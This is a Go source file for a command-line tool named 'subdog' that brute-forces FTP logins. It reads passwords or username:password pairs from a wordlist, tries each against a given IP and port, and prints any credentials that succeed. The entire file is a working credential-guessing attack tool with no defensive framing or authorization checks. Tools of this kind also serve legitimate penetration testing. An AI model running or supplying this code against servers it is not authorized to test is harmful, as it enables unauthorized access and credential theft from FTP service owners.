package main

import (
    "flag"
    "fmt"
    "io/ioutil"
    "strings"
    "os"
    "github.com/jlaffaye/ftp"
)

// prints the version message
const version = "0.0.2"

func printVersion() {
    fmt.Printf("Current subdog version %s\n", version)
}

func main() {
    // Define flags with short names
    mode := flag.String("mode", "", "Mode of operation: 'su' for single-username or 'upc' for username-password-combination")
    ip := flag.String("ip", "", "IP and port for FTP login")
    wordlist := flag.String("wordlist", "", "File containing passwords or usernames & passwords")
    username := flag.String("username", "", "Username for FTP login (required for 'su' mode)")
    version := flag.Bool("version", false, "Print the version of the tool and exit.")
    flag.Parse()

    // Print version and exit if -version flag is provided
    if *version {
        printVersion()
        return
    }

    // Convert short mode names to full names
    if *mode == "su" {
        *mode = "single-username"
    } else if *mode == "upc" {
        *mode = "username-password-combination"
    } else {
        fmt.Println("Invalid mode specified. Use 'su' or 'upc'.")
        return
    }

    if *mode == "single-username" && *username == "" {
        fmt.Println("Username is required for single-username mode.")
        return
    }

    // Open the file
    file, err := ioutil.ReadFile(*wordlist)
    if err != nil {
        fmt.Println(err)
        return
    }

    // Split the file contents by newlines
    lines := strings.Split(string(file), "\n")
    found := false

    // Iterate through each line
    for _, line := range lines {
        // Trim whitespace and skip empty lines
        line = strings.TrimSpace(line)
        if line == "" {
            continue // Skip empty lines
        }

        // Determine the password or username:password
        var password string
        var user string

        if *mode == "single-username" {
            password = line
            user = *username
        } else if *mode == "username-password-combination" {
            parts := strings.Split(line, ":")
            if len(parts) < 2 {
                fmt.Printf("Invalid line in userpass file: %s\n", line)
                continue
            }
            user = parts[0]
            password = parts[1]
        }

        // Try to log in
        client, err := ftp.Dial(*ip)
        if err != nil {
            fmt.Println("Program stopped because of connection timeout.")
            return // Exit the program if there's a connection error
        }

        // Print "Trying password"
        fmt.Printf("[+] Trying %s:%s\n", user, password)

        err = client.Login(user, password)
        if err == nil {
            // If the login is successful, print the password and exit the program
            fmt.Printf("Successfully logged in with ip:%s username:%s password:%s\n", *ip, user, password)
            client.Quit()
            found = true
            os.Exit(0)
        } else {
            client.Quit()
        }
    }

    if !found {
        fmt.Printf("Password Not Found with ip:%s\n", *ip)
    }
}
